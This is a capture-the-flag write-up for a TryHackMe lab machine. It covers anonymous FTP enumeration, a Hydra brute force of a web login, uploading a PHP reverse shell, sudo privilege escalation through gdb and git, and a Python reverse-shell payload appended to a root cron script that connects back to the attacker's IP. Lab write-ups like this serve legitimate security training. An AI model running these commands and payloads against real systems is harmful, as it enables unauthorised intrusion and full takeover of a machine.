# TryHackMe-Tartarus Remastered

>Abdullah Rizwan | 21st September , 06:57 PM


## NMAP


```
Nmap scan report for 10.10.164.74
Host is up (0.23s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.94.60
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 98:6c:7f:49:db:54:cb:36:6d:d5:ff:75:42:4c:a7:e0 (RSA)
|   256 0c:7b:1a:9c:ed:4b:29:f5:3e:be:1c:9a:e4:4c:07:2c (ECDSA)
|_  256 50:09:9f:c0:67:3e:89:93:b0:c9:85:f1:93:89:50:68 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.06 seconds

```

## PORT 80

`http://10.10.164.74/robots.txt`.

We can find robots.txt file from where we can see `/admin-dir` is accessible and there are possible usernames and passwords




## FTP (Port 21)

Since Anonymous FTP login is allowed we can use that to see what's in `www-data`'s directory.  
```
ftp 10.10.164.74
Connected to 10.10.164.74.
220 (vsFTPd 3.0.3)
Name (10.10.164.74:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 .
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ...
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
226 Directory send OK.
ftp> 

```
We can use `get test.txt` to save it locally on our machine.

This was the content of `test.txt`
`vsftpd test file`


But there is another directory which you can miss because it's named as `...`

```
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 .
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
drwxr-xr-x    2 ftp      ftp          4096 Jul 05 21:31 ...
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jul 05 21:31 .
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
-rw-r--r--    1 ftp      ftp            14 Jul 05 21:45 yougotgoodeyes.txt
226 Directory send OK.

```

This is the content of `yougotgoodeyes.txt` which is a directory for the webpage.
`/sUp3r-s3cr3t`


## Hydra

```
hydra -L users -P passwords.txt 10.10.164.74 http-post-form "/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:Incorrect"
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-21 10:35:30
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1313 login tries (l:13/p:101), ~83 tries per task
[DATA] attacking http-post-form://10.10.164.74:80/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:Incorrect
[80][http-post-form] host: 10.10.164.74   login: enox   password: P@ssword1234

```
After getting authenticated we are now shown an upload from where we could upload a php reverse shell


## Reverse Shell


Getting a reverse shell first setup netcat listener for any port you want as long as it is not being used

`nc -lvp 5555`


Then get reverse shell from pentest monkey : https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

In the php file change `$ip` and `$port` variable to you connected VPN IP and port on which you have set your netcat.

Upload it and execute it from here :

`http://10.10.164.74/sUp3r-s3cr3t/images/uploads/`


Just an extra step if you want you can stabilize shell using this technique so that you can use clear command or auto tab complete

```
1. python -c "import pty;pty.spawn('/bin/bash')";
2. ctrl+z
3. stty raw -echo
4. fg and then press enter 2 times.

```
You can then find user flag in `d4rckh` directory.

User flag : `0f7dbb2243e692e3ad222bc4eff8521f`


## Privilege Escalation


### thirtytwo

We can find SUID files with `find / -perm /4000` and we find `/var/www/gdb`

Then `sudo -l` we can see user `thirtytwo` can run gdb so visiting GTFOBINS we find this one liner which escalates us to user.

`sudo -u thirtytwo /var/www/gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit` 


Then again check for `sudo -l`


```
thirtytwo@ubuntu-xenial:/home/d4rckh$ sudo -l
Matching Defaults entries for thirtytwo on ubuntu-xenial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User thirtytwo may run the following commands on ubuntu-xenial:
    (d4rckh) NOPASSWD: /usr/bin/git

```
We can see d4rchk can run `git` so let's try to escalate throguh `git`.


### d4rchk

1. sudo -u d4rchk git -p help config
2. !/bin/sh


```
$ whoami
d4rckh

```

### Root

`/home/d4rchk` has a file named `clean.py` we can see append the contents for python reverse shell then wait for a moment because this is running as a cron job.


```
d4rckh@ubuntu-xenial:/home/d4rckh$ nano cleanup.py 

import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.8.94.60",9999))
os.dup2(s.fileno(),0) 
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

```
Setting up again a netcat listener.

```
nc -lvp 9999
listening on [any] 9999 ...
10.10.164.74: inverse host lookup failed: Unknown host
connect to [10.8.94.60] from (UNKNOWN) [10.10.164.74] 53654
/bin/sh: 0: can't access tty; job control turned off
# 


```